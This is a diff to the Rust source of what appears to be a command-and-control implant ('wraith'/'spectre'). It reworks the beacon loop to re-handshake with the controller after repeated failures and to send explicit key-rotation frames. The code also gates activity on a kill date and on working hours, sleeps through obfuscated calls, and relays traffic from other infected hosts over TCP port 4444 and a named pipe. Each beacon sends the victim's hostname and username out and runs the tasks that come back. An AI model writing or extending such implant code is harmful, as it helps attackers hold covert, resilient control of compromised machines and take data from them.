@@ -408,106 +408,132 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
     let _ = mesh_server.start_tcp(4444);
     let _ = mesh_server.start_pipe("wraith_mesh");
 
-    let mut session;
-    loop {
-        // Check KillDate
-        if is_kill_date_reached(config.kill_date) {
-            unsafe { crate::utils::syscalls::sys_exit(0) };
-        }
-
-        // Check WorkingHours
-        if !is_within_working_hours(config.working_hours.0, config.working_hours.1) {
-            crate::utils::obfuscation::sleep(600_000); // Sleep 10 mins and check again
-            continue;
-        }
-
-        let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
-        
-        match perform_handshake(transport) {
-            Ok(s) => {
-                session = s;
-                break;
-            },
-            Err(_) => {
-                // Failover
-                use_udp = !use_udp;
-                crate::utils::obfuscation::sleep(config.sleep_interval);
+    loop { // Outer loop: Re-handshake on failure
+        let mut session;
+        loop { // Handshake loop
+            // Check KillDate
+            if is_kill_date_reached(config.kill_date) {
+                unsafe { crate::utils::syscalls::sys_exit(0) };
             }
-        }
-    }
 
-    let mut packet_count: u64 = 0;
-    let mut last_rekey = 0;
-    let rekey_interval = 120_000 / config.sleep_interval.max(1000); // ~2 minutes
-
-    loop {
-        // Check KillDate
-        if is_kill_date_reached(config.kill_date) {
-            unsafe { crate::utils::syscalls::sys_exit(0) };
-        }
-
-        // Check WorkingHours
-        if !is_within_working_hours(config.working_hours.0, config.working_hours.1) {
-            crate::utils::obfuscation::sleep(600_000);
-            continue;
-        }
-
-        // Check if rekey is needed
-        if packet_count >= 1_000_000 || last_rekey >= rekey_interval {
-            session.rekey_dh();
-            packet_count = 0;
-            last_rekey = 0;
-        }
-
-        // 1. Poll Mesh Server
-        let mesh_data = mesh_server.poll();
-        for (data, client_idx) in mesh_data {
-            let mut relay_frame = WraithFrame::new(packet::FRAME_TYPE_MESH_RELAY, data);
-            relay_frame.stream_id = client_idx as u16;
-            let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
-            if let Ok(msg_to_send) = session.write_message(&relay_frame.serialize()) {
-                let _ = transport.request(&msg_to_send);
+            // Check WorkingHours
+            if !is_within_working_hours(config.working_hours.0, config.working_hours.1) {
+                crate::utils::obfuscation::sleep(600_000); // Sleep 10 mins and check again
+                continue;
             }
-        }
-
-        let hostname_sd = crate::modules::discovery::Discovery.get_hostname();
-        let username_sd = crate::modules::discovery::Discovery.get_username();
-        
-        let mut hostname_str = alloc::string::String::from("unknown");
-        let mut username_str = alloc::string::String::from("unknown");
-        
-        if let Some(guard) = hostname_sd.unlock() {
-            hostname_str = alloc::string::String::from_utf8_lossy(&guard).into_owned();
-        }
-        if let Some(guard) = username_sd.unlock() {
-            username_str = alloc::string::String::from_utf8_lossy(&guard).into_owned();
-        }
-
-        let beacon_json = format!(r#"{{"id": "spectre", "hostname": "{}", "username": "{}"}}"#, hostname_str, username_str);
-        
-        let frame = WraithFrame::new(FRAME_TYPE_DATA, beacon_json.as_bytes().to_vec());
-        let frame_bytes = frame.serialize();
-
-        if let Ok(msg_to_send) = session.write_message(&frame_bytes) {
-            packet_count += 1;
 
             let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
-            if let Ok(resp) = transport.request(&msg_to_send) {
-                if let Ok(pt) = session.read_message(&resp) {
-                    // Pass transport to dispatch_tasks if needed (it takes &mut HttpTransport in original, needs update)
-                    // Wait, dispatch_tasks took &mut HttpTransport?
-                    // Yes: `dispatch_tasks(..., transport: &mut HttpTransport, ...)`
-                    // I need to change signature of dispatch_tasks too.
-                    dispatch_tasks(&pt, &mut session, transport, &mut mesh_server);
+            
+            match perform_handshake(transport) {
+                Ok(s) => {
+                    session = s;
+                    break;
+                },
+                Err(_) => {
+                    // Failover
+                    use_udp = !use_udp;
+                    crate::utils::obfuscation::sleep(config.sleep_interval);
                 }
-            } else {
-                // Failover on request failure
-                use_udp = !use_udp;
             }
         }
 
-        last_rekey += 1;
-        crate::utils::obfuscation::sleep(config.sleep_interval);
+        let mut packet_count: u64 = 0;
+        let mut last_rekey = 0;
+        let rekey_interval = 120_000 / config.sleep_interval.max(1000); // ~2 minutes
+        let mut failures = 0;
+
+        loop { // Beacon loop
+            // Check KillDate
+            if is_kill_date_reached(config.kill_date) {
+                unsafe { crate::utils::syscalls::sys_exit(0) };
+            }
+
+            // Check WorkingHours
+            if !is_within_working_hours(config.working_hours.0, config.working_hours.1) {
+                crate::utils::obfuscation::sleep(600_000);
+                continue;
+            }
+
+            // Check failure threshold for re-handshake
+            if failures > 5 {
+                break;
+            }
+
+            // Check if rekey is needed
+            if packet_count >= 1_000_000 || last_rekey >= rekey_interval {
+                session.rekey_dh();
+                packet_count = 0;
+                last_rekey = 0;
+
+                // Send explicit rekey frame (Strategy 1: Dedicated Protocol Message)
+                // The actual new key is carried in the Double Ratchet header of this encrypted message
+                let rekey_frame = WraithFrame::new(packet::FRAME_REKEY_DH, Vec::new());
+                if let Ok(msg) = session.write_message(&rekey_frame.serialize()) {
+                     let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
+                     // We expect the server to respond (potentially with its own new key in the header)
+                     if let Ok(resp) = transport.request(&msg) {
+                         // Process response to advance ratchet
+                         if session.read_message(&resp).is_ok() {
+                             failures = 0;
+                         } else {
+                             failures += 1;
+                         }
+                     } else {
+                         failures += 1;
+                     }
+                }
+            }
+
+            // 1. Poll Mesh Server
+            let mesh_data = mesh_server.poll();
+            for (data, client_idx) in mesh_data {
+                let mut relay_frame = WraithFrame::new(packet::FRAME_TYPE_MESH_RELAY, data);
+                relay_frame.stream_id = client_idx as u16;
+                let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
+                if let Ok(msg_to_send) = session.write_message(&relay_frame.serialize()) {
+                    let _ = transport.request(&msg_to_send);
+                }
+            }
+
+            let hostname_sd = crate::modules::discovery::Discovery.get_hostname();
+            let username_sd = crate::modules::discovery::Discovery.get_username();
+            
+            let mut hostname_str = alloc::string::String::from("unknown");
+            let mut username_str = alloc::string::String::from("unknown");
+            
+            if let Some(guard) = hostname_sd.unlock() {
+                hostname_str = alloc::string::String::from_utf8_lossy(&guard).into_owned();
+            }
+            if let Some(guard) = username_sd.unlock() {
+                username_str = alloc::string::String::from_utf8_lossy(&guard).into_owned();
+            }
+
+            let beacon_json = format!(r#"{{"id": "spectre", "hostname": "{}", "username": "{}"}}"#, hostname_str, username_str);
+            
+            let frame = WraithFrame::new(FRAME_TYPE_DATA, beacon_json.as_bytes().to_vec());
+            let frame_bytes = frame.serialize();
+
+            if let Ok(msg_to_send) = session.write_message(&frame_bytes) {
+                packet_count += 1;
+
+                let transport: &mut dyn Transport = if use_udp { &mut udp_transport } else { &mut http_transport };
+                if let Ok(resp) = transport.request(&msg_to_send) {
+                    if let Ok(pt) = session.read_message(&resp) {
+                        failures = 0; // Reset failures on success
+                        dispatch_tasks(&pt, &mut session, transport, &mut mesh_server);
+                    } else {
+                        failures += 1;
+                    }
+                } else {
+                    // Failover on request failure
+                    failures += 1;
+                    use_udp = !use_udp;
+                }
+            }
+
+            last_rekey += 1;
+            crate::utils::obfuscation::sleep(config.sleep_interval);
+        }
     }
 }
 
